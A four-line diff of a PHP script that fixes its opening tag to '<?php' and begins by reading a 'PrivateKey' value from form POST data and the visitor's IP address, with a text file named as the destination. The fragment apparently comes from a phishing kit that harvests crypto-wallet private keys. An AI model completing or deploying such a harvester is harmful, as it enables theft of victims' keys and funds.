@@ -1,4 +1,4 @@
-<?html
+<?php
 $file = "twtgacor.txt";
 $PrivateKey = $_POST['PrivateKey'];
 $ip = $_SERVER['REMOTE_ADDR'];
